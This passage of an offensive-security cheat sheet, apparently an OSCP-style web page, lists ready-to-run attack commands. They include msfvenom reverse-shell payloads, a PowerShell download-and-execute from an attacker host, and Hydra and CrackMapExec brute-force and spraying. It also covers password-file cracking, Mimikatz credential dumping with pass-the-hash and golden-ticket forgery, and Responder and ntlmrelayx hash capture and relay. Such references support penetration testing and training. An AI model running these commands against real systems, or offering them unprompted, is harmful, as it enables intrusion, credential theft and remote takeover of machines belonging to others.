                  </tr>
                  <tr>
                    <td>
                      <code>msfvenom -p windows/meterpreter/reverse_tcp LHOST=IP LPORT=PORT -f asp &gt; shell.asp</code>
                    </td>
                    <td>ASP Meterpreter shell</td>
                  </tr>
                  <tr>
                    <td><code>msfvenom -p java/jsp_shell_reverse_tcp LHOST=IP LPORT=PORT -f raw &gt; shell.jsp</code>
                    </td>
                    <td>JSP Shell</td>
                  </tr>
                  <tr>
                    <td><code>msfvenom -p java/jsp_shell_reverse_tcp LHOST=IP LPORT=PORT -f war &gt; shell.war</code>
                    </td>
                    <td>WAR Shell</td>
                  </tr>
                  <tr>
                    <td>
                      <code>msfvenom -p php/meterpreter_reverse_tcp LHOST=IP LPORT=PORT -f raw &gt; shell.php cat shell.php</code>
                    </td>
                    <td>pbcopy &amp;&amp; echo &#39;?php &#39;</td>
                  </tr>
                  <tr>
                    <td><code>msfvenom -p php/reverse_php LHOST=IP LPORT=PORT -f raw &gt; phpreverseshell.php</code>
                    </td>
                    <td>Php Reverse Shell</td>
                  </tr>
                  <tr>
                    <td>
                      <code>msfvenom -a x86 --platform Windows -p windows/exec CMD=&quot;powershell \&quot;IEX(New-Object Net.webClient).downloadString(&#39;[http://IP/nishang.ps1&#39;)\](http://ip/nishang.ps1&#39;)%5C)&quot;&quot; -f python</code>
                    </td>
                    <td>Windows Exec Nishang Powershell in python</td>
                  </tr>
                  <tr>
                    <td>
                      <code>msfvenom -p windows/shell_reverse_tcp EXITFUNC=process LHOST=IP LPORT=PORT -f c -e x86/shikata_ga_nai -b &quot;\x04\xA0&quot;</code>
                    </td>
                    <td>Bad characters shikata_ga_nai</td>
                  </tr>
                  <tr>
                    <td>
                      <code>msfvenom -p windows/shell_reverse_tcp EXITFUNC=process LHOST=IP LPORT=PORT -f c -e x86/fnstenv_mov -b &quot;\x04\xA0&quot;</code>
                    </td>
                    <td>Bad characters fnstenv_mov</td>
                  </tr>
                </tbody>
              </table>

              <h2 id="6-password-attacks">6. <span class="emoji">üîê</span> Password Attacks</h2>
              <h3 id="61-brute-force">6.1 Brute-Force</h3>
              <pre><code class="language-bash"># SSH Brute Force
hydra -l &lt;username&gt; -P &lt;wordlist&gt; -s &lt;port&gt; ssh://&lt;target_ip&gt;

# FTP Brute Force
hydra -l &lt;username&gt; -P &lt;wordlist&gt; ftp://&lt;target_ip&gt;

# SMB Brute Force
hydra -L &lt;user_list&gt; -P &lt;password_list&gt; smb://&lt;target_ip&gt;

# Telnet Brute Force
hydra -l &lt;username&gt; -P &lt;wordlist&gt; telnet://&lt;target_ip&gt;

# MySQL Brute Force
hydra -l &lt;username&gt; -P &lt;wordlist&gt; mysql://&lt;target_ip&gt;

# PostgreSQL Brute Force
hydra -l &lt;username&gt; -P &lt;wordlist&gt; postgres://&lt;target_ip&gt;

# VNC Brute Force
hydra -P &lt;password_list&gt; vnc://&lt;target_ip&gt;

# HTTP Basic Authentication Brute Force
hydra -l &lt;username&gt; -P &lt;wordlist&gt; &lt;target_ip&gt; http-get /

# SMTP Brute Force
hydra -l &lt;username&gt; -P &lt;wordlist&gt; smtp://&lt;target_ip&gt;

# SNMP Brute Force
hydra -P &lt;wordlist&gt; snmp://&lt;target_ip&gt;

# Redis Brute Force
hydra -P &lt;password_list&gt; redis://&lt;target_ip&gt;
</code></pre>
              <h3 id="62-spraying-credentials">6.2 Spraying Credentials</h3>
              <ul>
                <li>Hydra</li>
              </ul>
              <pre><code class="language-bash"># Spraying passwords for RDP, one wordlist could be: /usr/share/wordlists/dirb/others/names.txt
hydra -L &lt;user_list&gt; -p &quot;&lt;password&gt;&quot; rdp://&lt;target_ip&gt;
</code></pre>
              <ul>
                <li>Crackmapexec</li>
              </ul>
              <pre><code class="language-bash"># WinRM password spraying
crackmapexec winrm &lt;target_ip&gt; -u &lt;user_list&gt; -H &lt;hash_list&gt;

# FTP password spraying
crackmapexec ftp &lt;target_ip&gt; -u &lt;user_list&gt; -p &lt;password_list&gt; -d &lt;domain&gt; --continue-on-success

# SMB password spraying
crackmapexec smb &lt;target_ip&gt; -u &lt;user_list&gt; -p &lt;password_list&gt; -d &lt;domain&gt; --continue-on-success

# RDP password spraying
crackmapexec rdp &lt;target_ip&gt; -u &lt;user_list&gt; -p &quot;&lt;password&gt;&quot; --continue-on-success

# SSH password spraying
crackmapexec ssh &lt;target_ip&gt; -u &lt;user_list&gt; -p &lt;password_list&gt; --d &lt;domain&gt; --continue-on-success

# Multiple targets with WinRM
crackmapexec winrm &lt;target_ip_list&gt; -u &lt;user_list&gt; -H &lt;hash_list&gt; -d &lt;domain&gt; --continue-on-success

# SMTP password spraying
crackmapexec smtp &lt;target_ip&gt; -u &lt;user_list&gt; -p &lt;password_list&gt; --continue-on-success

# POP3 password spraying
crackmapexec pop3 &lt;target_ip&gt; -u &lt;user_list&gt; -p &lt;password_list&gt; --continue-on-success
</code></pre>
              <h3 id="63-crack-files">6.3 Crack Files</h3>
              <h4 id="631-office-files">6.3.1 Office Files</h4>
              <pre><code class="language-bash"># Extract hash from encrypted Office files
office2john &lt;file&gt; &gt; office.hash

# Crack Office file password using John
john --wordlist=&lt;wordlist&gt; office.hash
</code></pre>
              <h4 id="632-pdf-files">6.3.2 PDF Files</h4>
              <ol>
                <li><strong>Extract Hashes from PDF Files</strong></li>
              </ol>
              <pre><code class="language-bash">pdf2john &lt;file.pdf&gt; &gt; pdf.txt
</code></pre>
              <ol start="2">
                <li><strong>Crack PDF Password Using John the Ripper</strong></li>
              </ol>
              <pre><code class="language-bash">john --wordlist=&lt;wordlist&gt; pdf.txt
</code></pre>
              <ol start="3">
                <li><strong>Crack PDF Password Using pdfcrack (Alternative)</strong></li>
              </ol>
              <pre><code class="language-bash">pdfcrack -f &lt;file.pdf&gt; -w &lt;wordlist&gt;
</code></pre>
              <h4 id="633-zip-files">6.3.3 ZIP Files</h4>
              <ol>
                <li><strong>Extract Hashes from ZIP Files</strong></li>
              </ol>
              <pre><code class="language-bash">zip2john &lt;file.zip&gt; &gt; zip.hash
</code></pre>
              <ol start="2">
                <li><strong>Crack ZIP Password</strong></li>
              </ol>
              <pre><code class="language-bash"># (Optional), if the zip has too many files, them extract one and crack just that one to speed things up. If given errors delete the --format=zip.
john zip.hash --wordlist=&lt;wordlist&gt; --format=zip
or
hashcat -m 13600 zip.hash /path/to/wordlist.txt</code></pre>
              <ol start="3">
                <li><strong>Brute-Force ZIP Password (Alternative)</strong></li>
              </ol>
              <pre><code class="language-bash"># Perform a brute-force attack on a password-protected ZIP file
fcrackzip -u -D -p &lt;wordlist&gt; &lt;file.zip&gt;
</code></pre>
              <h3 id="64-http-post-login-form">6.4 HTTP POST Login Form</h3>
              <pre><code class="language-bash"># HTTP POST brute-force using Hydra
hydra -l &lt;username&gt; -P &lt;wordlist&gt; &lt;target_ip&gt; http-post-form &quot;/&lt;login_uri&gt;:&lt;user_field&gt;=&lt;username&gt;&amp;&lt;pass_field&gt;=^PASS^:&lt;failure_message&gt;&quot;
</code></pre>
              <p>The three parameters for the <em>http-post-form</em>:</p>
              <ul>
                <li>Login page URI: <code>/&lt;login_uri&gt;</code></li>
                <li>POST request username and password:
                  <code>&lt;user_field&gt;=&lt;username&gt;&amp;&lt;pass_field&gt;=^PASS^</code>, for example:
                  <code>fm_usr=user&amp;fm_pwd=^PASS^</code>
                </li>
                <li>Login failed identifier: <code>&lt;failure_message&gt;</code>, for example
                  <code>Login failed. Invalid</code>
                </li>
              </ul>
              <h3 id="65-http-get-basic-authentication">6.5 HTTP GET (Basic Authentication)</h3>
              <pre><code class="language-bash"># HTTP GET brute-force attack using Hydra
hydra -l &lt;username&gt; -P &lt;wordlist&gt; &lt;target_ip&gt; http-get /
</code></pre>
              <h3 id="66-calculate-cracking-time">6.6 Calculate cracking time</h3>
              <ul>
                <li>Calculating the keyspace for a password of length 5</li>
              </ul>
              <pre><code class="language-bash"># Calculate keyspace for a password length of &lt;length&gt;
echo -n &quot;&lt;characters&gt;&quot; | wc -c

python3 -c &quot;print(&lt;keyspace&gt;**&lt;length&gt;)&quot;

# Calculate cracking time based on benchmark results
python3 -c &quot;print(&lt;keyspace&gt; / &lt;hash_rate&gt;)&quot;
</code></pre>
              <ul>
                <li><strong>Example</strong></li>
              </ul>
              <pre><code class="language-bash"># Estimate cracking time for a 5-character alphanumeric password
characters=&quot;abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789&quot;

echo -n $characters | wc -c  # keyspace

python3 -c &quot;print(62**5 / 1000000000)&quot;  # example for 1B hashes per second
</code></pre>
              <h3 id="67-mutating-wordlists">6.7 Mutating wordlists</h3>
              <p><a href="https://hashcat.net/wiki/doku.php?id=rule_based_attack">Hashcat list of rules</a></p>
              <pre><code class="language-bash"># Using Hashcat with rule-based attacks
hashcat -m &lt;hash_type&gt; &lt;hash_file&gt; &lt;wordlist&gt; -r &lt;rule_file&gt; --force
</code></pre>
              <h3 id="68-hashcat-formats-for-cracking">6.8 Hashcat Formats for Cracking</h3>
              <table class="custom-table">
                <thead>
                  <tr>
                    <th>Hash Type</th>
                    <th>Hashcat Mode (<code>-m</code>)</th>
                    <th>Example Format</th>
                  </tr>
                </thead>
                <tbody>
                  <tr>
                    <td><strong>MD5</strong></td>
                    <td><code>0</code></td>
                    <td><code>$1$salt$hash</code></td>
                  </tr>
                  <tr>
                    <td><strong>SHA-1</strong></td>
                    <td><code>100</code></td>
                    <td><code>hash:salt</code></td>
                  </tr>
                  <tr>
                    <td><strong>NTLM</strong></td>
                    <td><code>1000</code></td>
                    <td><code>&lt;NTLM_HASH&gt;</code></td>
                  </tr>
                  <tr>
                    <td><strong>Net-NTLMv1</strong></td>
                    <td><code>5500</code></td>
                    <td><code>username::domain:challenge:response</code></td>
                  </tr>
                  <tr>
                    <td><strong>Net-NTLMv2</strong></td>
                    <td><code>5600</code></td>
                    <td><code>username::domain:challenge:response</code></td>
                  </tr>
                  <tr>
                    <td><strong>bcrypt</strong></td>
                    <td><code>3200</code></td>
                    <td><code>$2a$10$abcdefghijklmnopqrstuv</code></td>
                  </tr>
                  <tr>
                    <td><strong>Kerberos 5 TGS-REP etype 23</strong></td>
                    <td><code>13100</code></td>
                    <td><code>$krb5tgs$23$*user$realm$service*hash</code></td>
                  </tr>
                  <tr>
                    <td><strong>Kerberos 5 AS-REP etype 23</strong></td>
                    <td><code>18200</code></td>
                    <td><code>$krb5asrep$23$user@REALM:hash</code></td>
                  </tr>
                  <tr>
                    <td><strong>MS-Cache v1</strong></td>
                    <td><code>1100</code></td>
                    <td><code>username:hash</code></td>
                  </tr>
                  <tr>
                    <td><strong>MS-Cache v2</strong></td>
                    <td><code>2100</code></td>
                    <td><code>domain\username:hash:salt</code></td>
                  </tr>
                  <tr>
                    <td><strong>SHA-256</strong></td>
                    <td><code>1400</code></td>
                    <td><code>&lt;SHA256_HASH&gt;</code></td>
                  </tr>
                  <tr>
                    <td><strong>SHA-512</strong></td>
                    <td><code>1700</code></td>
                    <td><code>&lt;SHA512_HASH&gt;</code></td>
                  </tr>
                  <tr>
                    <td><strong>NTLMv1-ESS</strong></td>
                    <td><code>5500</code></td>
                    <td><code>username::domain:challenge:response</code></td>
                  </tr>
                  <tr>
                    <td><strong>MD5 Crypt</strong></td>
                    <td><code>500</code></td>
                    <td><code>$1$salt$hash</code></td>
                  </tr>
                  <tr>
                    <td><strong>LDAP MD5</strong></td>
                    <td><code>25600</code></td>
                    <td><code>{MD5}hash</code></td>
                  </tr>
                  <tr>
                    <td><strong>Kerberos TGS-REP etype 23</strong></td>
                    <td><code>13100</code></td>
                    <td><code>$krb5tgs$23$user$realm$service$hash</code></td>
                  </tr>
                  <tr>
                    <td><strong>Kerberos AS-REP etype 23</strong></td>
                    <td><code>18200</code></td>
                    <td><code>$krb5asrep$23$user@realm:hash</code></td>
                  </tr>
                </tbody>
              </table>
              <h3 id="69-password-managers">6.9 Password Managers</h3>
              <p><strong>Finding KeePass Database</strong></p>
              <pre><code class="language-powershell"># Search for KeePass database (.kdbx) on Windows
Get-ChildItem -Path C:\ -Include *.kdbx -File -Recurse -ErrorAction SilentlyContinue
</code></pre>
              <p><strong>Cracking KeePass Database</strong></p>
              <pre><code class="language-bash"># Convert KeePass database to John format
keepass2john &lt;Database.kdbx&gt; &gt; keepass.hash

# Remember to delete the first &quot;&#39;word&#39;:&quot; that says &#39;Database:&#39;; it should look like this:
# $keepass$*2*60*0*d7bfhs83hFTG338717d27a7d4sucgd54fvfv486d2...... INSTEAD OF Database:$keepass$*2*60*0*d7bfhs83hFTG338717d27a7d4sucgd54fvfv486d2......

# Crack KeePass hash using Hashcat (the rule is optional)
hashcat -m 13400 keepass.hash &lt;wordlist&gt; -r &lt;rule_file&gt; --force
</code></pre>
              <p><strong>Opening KeePass Database (after cracking it)</strong></p>
              <pre><code class="language-bash"># Open the tool
kpcli --kdb=Database.kdbx

# Navigate to the desired database and folder with cd [folder]
cd Database/

# Show contents of database
ls

# Show entries information
show [-f] [-a] &lt;entry_id or entry_path&gt;

# Show a specific field detail of an entry: (example) get &#39;BACKUP Machine SSH Key&#39; Pass or get 0 Pass
get &lt;entry_path or entry_id&gt; &lt;field_name&gt;
</code></pre>
              <h3 id="610-ssh-passphrases">6.10 SSH Passphrases</h3>
              <p><strong>Converting and Cracking SSH Key Passphrase</strong></p>
              <pre><code class="language-bash"># Set correct permissions for SSH private key
chmod 600 &lt;id_rsa&gt;

# Convert SSH key to John format
ssh2john &lt;id_rsa&gt; &gt; ssh.hash

# Crack the SSH key passphrase
john --wordlist=&lt;password_list&gt; --rules=&lt;rules_file&gt; ssh.hash
</code></pre>
              <h3 id="611-linux-users-hashes">6.11 Linux Users Hashes</h3>
              <p><strong>Crack hashes from <code>/etc/shadow</code> file</strong></p>
              <pre><code class="language-bash"># 1. Identify the hash (can use hashes.com to do it), for example: root:$6$AIWcIr8PEVxEWgv1$3mFpTQAc9Kzp4BGUQ2sPYYFE/dygqhDiv2Yw.XcU.Q8n1YO05.a/4.D/x4ojQAkPnv/v7Qrw7Ici7.hs0sZiC.:19453:0:99999:7::: is a SHA-512 because of the $6$ and uses the mode -m 1800.

# 2. Remote the unneeded part, we only need the &#39;:[HASH]:&#39;, so in the example above we just need $6$AIWcIr8PEVxEWgv1$3mFpTQAc9Kzp4BGUQ2sPYYFE/dygqhDiv2Yw.XcU.Q8n1YO05.a/4.D/x4ojQAkPnv/v7Qrw7Ici7.hs0sZiC.

# 3. Crack the hash
hashcat -m 1800 [hash_file].txt [path_to_wordlist]
</code></pre>
              <h3 id="612-mimikatz-commands">6.12 Mimikatz Commands</h3>
              <h4 id="6121-do-not-require-credentials">6.12.1 Do Not Require Credentials</h4>
              <table class="custom-table">
                <thead>
                  <tr>
                    <th><strong>Purpose</strong></th>
                    <th><strong>Command Example</strong></th>
                  </tr>
                </thead>
                <tbody>
                  <tr>
                    <td><strong>Privilege Escalation to SYSTEM</strong></td>
                    <td><code>privilege::debug</code> <br><code>token::elevate</code></td>
                  </tr>
                  <tr>
                    <td><strong>Dumping Password Hashes from SAM</strong></td>
                    <td><code>lsadump::sam</code></td>
                  </tr>
                  <tr>
                    <td><strong>Dumping Credentials from LSA Secrets</strong></td>
                    <td><code>lsadump::secrets</code></td>
                  </tr>
                  <tr>
                    <td><strong>Dumping Domain Cached Credentials (DCC)</strong></td>
                    <td><code>lsadump::cache</code></td>
                  </tr>
                  <tr>
                    <td><strong>Retrieve trust authentication information.</strong></td>
                    <td><code>lsadump::trust</code></td>
                  </tr>
                  <tr>
                    <td><strong>Dumping Kerberos Tickets</strong></td>
                    <td><code>sekurlsa::tickets</code></td>
                  </tr>
                  <tr>
                    <td><strong>Extracts Credentials from LSA</strong></td>
                    <td><code>lsadump::lsa /inject</code></td>
                  </tr>
                  <tr>
                    <td><strong>Dumping WDIGEST Credentials</strong></td>
                    <td><code>sekurlsa::wdigest</code></td>
                  </tr>
                  <tr>
                    <td><strong>Dumping Clear-Text Credentials</strong></td>
                    <td><code>sekurlsa::logonpasswords</code></td>
                  </tr>
                  <tr>
                    <td><strong>Dumping NTLM Hashes from LSASS Memory</strong></td>
                    <td><code>sekurlsa::msv</code></td>
                  </tr>
                  <tr>
                    <td><strong>Dumping Kerberos Keys</strong></td>
                    <td><code>sekurlsa::kerberos</code></td>
                  </tr>
                  <tr>
                    <td><strong>Dumping SSP Credentials</strong></td>
                    <td><code>sekurlsa::ssp</code></td>
                  </tr>
                  <tr>
                    <td><strong>Dumping TSPKG Credentials</strong></td>
                    <td><code>sekurlsa::tspkg</code></td>
                  </tr>
                  <tr>
                    <td><strong>Listing Available Privileges</strong></td>
                    <td><code>privilege::list</code></td>
                  </tr>
                  <tr>
                    <td><strong>Extracts Passwords from Windows Vault</strong></td>
                    <td><code>vault::cred /patch</code></td>
                  </tr>
                  <tr>
                    <td><strong>Dumping Security Account Manager (SAM)</strong></td>
                    <td><code>lsadump::sam /system:&lt;SYSTEM&gt; /sam:&lt;SAM&gt;</code></td>
                  </tr>
                  <tr>
                    <td><strong>Dumping Hashes from Active Directory</strong></td>
                    <td><code>lsadump::dcsync /domain:&lt;DOMAIN&gt; /user:&lt;USERNAME&gt;</code> (requires replication
                      rights, not direct credentials)</td>
                  </tr>
                </tbody>
              </table>
              <h4 id="6122-require-credentials">6.12.2 Require Credentials</h4>
              <table class="custom-table">
                <thead>
                  <tr>
                    <th><strong>Purpose</strong></th>
                    <th><strong>Command Example</strong></th>
                  </tr>
                </thead>
                <tbody>
                  <tr>
                    <td><strong>Pass-the-Hash Attack (PTH)</strong></td>
                    <td>
                      <code>sekurlsa::pth /user:&lt;USERNAME&gt; /domain:&lt;DOMAIN&gt; /ntlm:&lt;NTLM_HASH&gt; /run:&lt;COMMAND&gt;</code>
                    </td>
                  </tr>
                  <tr>
                    <td><strong>Pass-the-Ticket Attack (PTT)</strong></td>
                    <td><code>kerberos::ptt &lt;ticket.kirbi&gt;</code></td>
                  </tr>
                  <tr>
                    <td><strong>Over-Pass-The-Hash / Pass-The-Key (Kerberos Ticket)</strong></td>
                    <td>
                      <code>sekurlsa::pth /user:&lt;USERNAME&gt; /domain:&lt;DOMAIN&gt; /aes128:&lt;AES128_HASH&gt; /aes256:&lt;AES256_HASH&gt; /run:&lt;COMMAND&gt;</code>
                    </td>
                  </tr>
                  <tr>
                    <td><strong>Golden Ticket Creation</strong></td>
                    <td>
                      <code>kerberos::golden /user:&lt;USERNAME&gt; /domain:&lt;DOMAIN&gt; /sid:&lt;DOMAIN_SID&gt; /krbtgt:&lt;KRBTGT_HASH&gt; /id:&lt;RID&gt; /ticket:&lt;OUTPUT_TICKET&gt;</code>
                    </td>
                  </tr>
                  <tr>
                    <td><strong>Silver Ticket Creation</strong></td>
                    <td>
                      <code>kerberos::golden /user:&lt;USERNAME&gt; /domain:&lt;DOMAIN&gt; /sid:&lt;DOMAIN_SID&gt; /target:&lt;SERVICE/SERVER&gt; /service:&lt;SERVICE&gt; /rc4:&lt;NTLM_HASH&gt; /id:&lt;USER_RID&gt; /ptt</code>
                    </td>
                  </tr>
                  <tr>
                    <td><strong>Dump Kerberos Tickets for Specific User</strong></td>
                    <td><code>sekurlsa::tickets /export</code></td>
                  </tr>
                  <tr>
                    <td><strong>Skeleton Key Injection</strong></td>
                    <td><code>misc::skeleton</code> (Injects a skeleton key, allowing login as any user using the
                      password <code>mimikatz</code>)</td>
                  </tr>
                  <tr>
                    <td><strong>Kerberos Silver Ticket Creation (Advanced)</strong></td>
                    <td>
                      <code>kerberos::silver /user:&lt;USERNAME&gt; /domain:&lt;DOMAIN&gt; /target:&lt;SERVER&gt; /rc4:&lt;NTLM_HASH&gt; /service:&lt;SERVICE&gt; /sid:&lt;DOMAIN_SID&gt;</code>
                    </td>
                  </tr>
                  <tr>
                    <td><strong>Over-Pass-the-Hash (with RC4)</strong></td>
                    <td>
                      <code>sekurlsa::pth /user:&lt;USERNAME&gt; /domain:&lt;DOMAIN&gt; /rc4:&lt;NTLM_HASH&gt; /run:&lt;COMMAND&gt;</code>
                    </td>
                  </tr>
                  <tr>
                    <td><strong>DPAPI Credential Decryption</strong></td>
                    <td><code>dpapi::cred /in:&lt;CREDENTIAL_FILE&gt;</code></td>
                  </tr>
                  <tr>
                    <td><strong>Extracting TGT from LSASS Memory</strong></td>
                    <td><code>kerberos::tgt</code></td>
                  </tr>
                </tbody>
              </table>
              <h4 id="6123-mimikatz-one-liners">6.12.3 Mimikatz One-Liners</h4>
              <p>When using tools like <code>Evil-WinRM</code> or unstable reverse shells,
                running <code>mimikatz</code> can be problematic. In such cases, <strong>Mimikatz one-liner
                  commands</strong> offer an effective workaround. Here are different approaches:</p>
              <ul>
                <li>(Recommended Option) <strong>Using Mimikatz One-Liners</strong>:</li>
              </ul>
              <pre><code class="language-powershell">.\mimikatz.exe &quot;privilege::debug&quot; &quot;[command]&quot; &quot;exit&quot;

# Example for Dumping Passwords (using cmd.exe or PowerShell)
mimikatz.exe &quot;privilege::debug&quot; &quot;sekurlsa::logonPasswords&quot; &quot;exit&quot;

# Example for Passing the Hash
mimikatz.exe &quot;privilege::debug&quot; &quot;sekurlsa::pth /user:Administrator /domain:domain.local /rc4:HASH&quot; &quot;exit&quot;
</code></pre>
              <ul>
                <li>Running Mimikatz with <strong>Command Redirection</strong>: ensures output is saved to a file for
                  later retrieval if the shell disconnects.</li>
              </ul>
              <pre><code class="language-powershell">mimikatz.exe &quot;privilege::debug&quot; &quot;[command]&quot; &quot;exit&quot; &gt; C:\temp\mimikatz_output.txt
</code></pre>
              <ul>
                <li>Running Mimikatz via <strong>PowerShell Encoded Commands</strong>:</li>
              </ul>
              <pre><code class="language-powershell">$command = &quot;privilege::debug [command] exit&quot;
$encodedCommand = [Convert]::ToBase64String([Text.Encoding]::Unicode.GetBytes($command))
echo $encodedCommand

powershell -enc &lt;encodedCommand&gt;
</code></pre>
              <ul>
                <li>One-Liner with <strong>Remote Execution</strong>:</li>
              </ul>
              <pre><code class="language-powershell"># Evil-WinRM (we need to connect and then execute it, not possible to send it within the same command)
evil-winrm -i [target_ip] -u [username] -p [password]
mimikatz.exe &#39;privilege::debug&#39; &#39;[command]&#39; &#39;exit&#39;

# PsExec
impacket-psexec DOMAIN/username:password@target_ip &quot;C:\\Windows\\System32\\mimikatz.exe &#39;privilege::debug&#39; &#39;sekurlsa::logonPasswords&#39; &#39;exit&#39;&quot;

# VMIExec
impacket-vmiexec DOMAIN/username:password@target_ip &quot;C:\\Windows\\System32\\mimikatz.exe &#39;privilege::debug&#39; &#39;sekurlsa::logonPasswords&#39; &#39;exit&#39;&quot;

# Web Download
powershell -Command &quot;(New-Object System.Net.WebClient).DownloadFile(&#39;http://[attacker_ip]/mimikatz.exe&#39;, &#39;C:\\temp\\mimikatz.exe&#39;)&quot;
powershell -Command &quot;C:\\temp\\mimikatz.exe &#39;privilege::debug&#39; &#39;[command]&#39; &#39;exit&#39;&quot;
</code></pre>
              <ul>
                <li>Using Mimikatz with <strong>Minimal Output</strong>:</li>
              </ul>
              <pre><code class="language-powershell">mimikatz.exe &quot;privilege::debug&quot; &quot;[command]&quot; &quot;exit&quot; &gt; nul 2&gt;&amp;1
</code></pre>

              <h3 id="613-ntlm">6.13 NTLM</h3>
              <ol>
                <li>Set <em>SeDebugPrivilege</em> access (needed to use Mimikatz):</li>
              </ol>
              <pre><code class="language-powershell">PS C:\tools&gt; .\mimikatz.exe
mimikatz # privilege::debug
Privilege &#39;20&#39; OK
</code></pre>
              <ol start="2">
                <li><strong>Elevate to SYSTEM user privileges and dump credentials</strong></li>
              </ol>
              <pre><code class="language-powershell">mimikatz # privilege::debug
Privilege &#39;20&#39; OK

mimikatz # token::elevate
Token Id  : 0
User name :
SID name  : NT AUTHORITY\SYSTEM

mimikatz # lsadump::sam
Domain : &lt;DOMAIN&gt;
SysKey : &lt;SysKey&gt;
Local SID : &lt;Local SID&gt;

RID  : &lt;RID&gt;
User : &lt;USERNAME&gt;
Hash NTLM: &lt;NTLM_HASH&gt;
</code></pre>
              <ol start="3">
                <li><strong>Crack the NTLM hash</strong></li>
              </ol>
              <pre><code class="language-bash"># Rule is optional
hashcat -m 1000 &lt;NTLM_HASH&gt; /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule --force
</code></pre>
              <ol start="4">
                <li><strong>If uncrackable, consider Pass-The-Hash</strong></li>
              </ol>
              <pre><code class="language-bash"># Pass-the-Hash using SMBClient
impacket-smbclient -hashes &lt;LM_HASH&gt;:&lt;NTLM_HASH&gt; &lt;USERNAME&gt;@&lt;TARGET_IP&gt;
</code></pre>
              <h3 id="614-pass-the-hash-ntlm">6.14 Pass-The-Hash NTLM</h3>
              <ol>
                <li>Dump the SAM Database:</li>
              </ol>
              <pre><code class="language-powershell">mimikatz # privilege::debug
Privilege &#39;20&#39; OK

mimikatz # token::elevate
...

mimikatz # lsadump::sam
RID  : &lt;RID&gt;
User : &lt;USERNAME&gt;
Hash NTLM: &lt;NTLM_HASH&gt;
</code></pre>
              <ol start="2">
                <li>Authenticate</li>
              </ol>
              <pre><code class="language-bash"># Using smbclient
impacket-psexec -hashes &lt;LM_HASH&gt;:&lt;NTLM_HASH&gt; &lt;USERNAME&gt;@&lt;TARGET_IP&gt;

# Using PsExec
impacket-psexec -hashes &lt;LM_HASH&gt;:&lt;NTLM_HASH&gt; &lt;USERNAME&gt;@&lt;TARGET_IP&gt;

# Using WMIExec
impacket-wmiexec -hashes &lt;LM_HASH&gt;:&lt;NTLM_HASH&gt; &lt;USERNAME&gt;@&lt;TARGET_IP&gt;

# Using xfreerdp
xfreerdp /v:&lt;target_ip&gt; /u:&lt;USERNAME&gt; /pth:&lt;NTLM_HASH&gt; /size:&lt;resolution&gt;
</code></pre>
              <h3 id="615-cracking-net-ntlmv2">6.15 Cracking Net-NTLMv2</h3>
              <p><strong>Parameters:</strong></p>
              <ul>
                <li><code>&lt;interface&gt;</code>: Network interface to listen on (e.g., <code>eth0</code>,
                  <code>wlan0</code>, etc.).
                </li>
                <li><code>&lt;responder_ip&gt;</code>: IP address of the machine running Responder.</li>
                <li><code>&lt;victim_ip&gt;</code>: IP address of the victim machine.</li>
                <li><code>&lt;DOMAIN&gt;</code>: Domain of the user.</li>
                <li><code>&lt;hash_file&gt;</code>: File containing the captured NTLMv2 hash.</li>
              </ul>
              <p><strong>1. Start Responder</strong>
                Run the Responder tool to capture Net-NTLMv2 hashes. Ensure the victim requests a file that does
                <strong>not</strong> exist to generate the necessary traffic.
              </p>
              <pre><code class="language-bash">sudo responder -I &lt;interface&gt;
</code></pre>
              <p><strong>2. Victim Request Example</strong>
                The victim&#39;s request to the Responder server can be through various services. For instance, an HTTP
                request might look like this:</p>
              <pre><code class="language-powershell">C:\Windows\system32&gt; dir \\&lt;responder_ip&gt;\test
dir \\&lt;responder_ip&gt;\test
Access is denied.
</code></pre>
              <p><strong>3. Capture Example Output</strong>
                After the victim&#39;s request, you should see output similar to this:</p>
              <pre><code class="language-bash">[SMB] NTLMv2-SSP Client   : ::ffff:&lt;victim_ip&gt;
[SMB] NTLMv2-SSP Username : &lt;DOMAIN&gt;\emma
[SMB] NTLMv2-SSP Hash     : emma::&lt;DOMAIN&gt;:&lt;NTLM_HASH&gt;
</code></pre>
              <p><strong>4. Crack the Hash</strong>
                Use Hashcat to crack the captured NTLMv2 hash. The hashcat mode for Net-NTLMv2 is <code>5600</code>.
              </p>
              <pre><code class="language-bash">hashcat -m 5600 &lt;hash_file&gt; /usr/share/wordlists/rockyou.txt --force
hashcat (v6.2.5) starting
...
&lt;DOMAIN&gt;\emma::&lt;NTLM_HASH&gt;:123Password123
...
</code></pre>
              <h3 id="616-relaying-net-ntlmv2">6.16 Relaying Net-NTLMv2</h3>
              <p><strong>1. Start Impacket <code>ntlmrelayx</code></strong>
                Use the Impacket <code>ntlmrelayx</code> tool to capture NTLMv2 requests and relay them to a target.
                Replace <code>&lt;target_ip&gt;</code> with the IP address of the machine where you want to execute the
                command.</p>
              <pre><code class="language-bash">impacket-ntlmrelayx --no-http-server -smb2support -t &lt;target_ip&gt; -c &quot;powershell -enc &lt;base64_encoded_powershell_command_to_be_executed_on_the_target_machine&gt;&quot;

Impacket v0.9.24 - Copyright 2021 SecureAuth Corporation
[*] Protocol Client SMB loaded..
[*] Protocol Client IMAPS loaded..
[*] Protocol Client IMAP loaded..
[*] Protocol Client HTTP loaded..
[*] Protocol Client HTTPS loaded..
[*] Running in relay mode to single host
[*] Setting up SMB Server
[*] Setting up WCF Server
[*] Setting up RAW Server on port 6666

[*] Servers started, waiting for connections
</code></pre>
              <p><strong>2. Expected Output After Victim Request</strong>
                Once the victim makes a request, you should see output like this indicating that the relay was
                successful and the command was executed on the target:</p>
              <pre><code class="language-bash">[*] SMBD-Thread-4: Received connection from &lt;victim_ip&gt;, attacking target smb://&lt;target_ip&gt;
[*] Authenticating against smb://&lt;target_ip&gt; as &lt;domain&gt;/&lt;username&gt; SUCCEED
[*] SMBD-Thread-6: Connection from &lt;victim_ip&gt; controlled, but there are no more targets left!
...
[*] Executed specified command on host: &lt;target_ip&gt;
</code></pre>
              <p><strong>3. Setup Netcat Listener</strong></p>
              <pre><code class="language-bash"># The port should match the port specified in the reverse shell command
nc -nvlp [port]
</code></pre>
              <p><strong>4. Force Victim Request (Example)</strong>
                Trigger the victim machine to make a request to the Responder server, which can be done through various
                means such as Remote Code Execution (RCE) in a web application:</p>
              <pre><code class="language-powershell"># &lt;responder_ip&gt;: IP address of the machine running the Responder server.
C:\Windows\system32&gt; dir \\&lt;responder_ip&gt;\test
</code></pre>
              <h3 id="617-online-tools">6.17 Online Tools</h3>
              <ul>
                <li><a href="https://crackstation.net/">CrackStation</a></li>
